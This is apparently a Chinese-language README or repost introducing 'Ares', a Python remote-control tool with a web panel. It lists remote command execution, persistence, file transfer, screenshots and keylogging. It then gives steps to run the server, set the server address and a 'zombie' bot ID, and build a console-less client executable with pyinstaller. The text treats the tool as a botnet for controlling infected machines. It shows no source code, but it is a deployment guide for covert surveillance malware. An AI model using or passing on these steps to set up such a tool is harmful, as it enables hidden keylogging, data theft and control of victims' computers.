**项目简介：**  

Ares是一个用python编写的B/S架构的远程控制工具。

  

**支持功能:**

*   远程命令执行
    
*   权限维持
    
*   文件上传/下载
    
*   屏幕截图
    
*   键盘记录
    
      
    

**使用方法：**  

  

先进行安装Server端：

  

cd server/

python db\_init.py

python server.py

如果提示错误，请先安装\[cherrypy\]模块，然后访问 http://localhost:8080 就可到看到webui了。  

  

**生成客户端：**  

首先你需要安装如下模块

*   requests
    
*   pythoncom
    
*   pyhook
    
*   PIL
    
      
    

**然后修改setting.py中的代码**：

SERVER\_URL = 改成你的服务器地址

BOT\_ID = 使用一个唯一的字符串做肉鸡的名称，若留空则用主机名

DEBUG = 调试模式

IDLE\_TIME = 检测时间.

REQUEST\_INTERVAL = 每次检查之间的间隔时间

cd client/

pyinstaller --onefile --noconsole agent.py
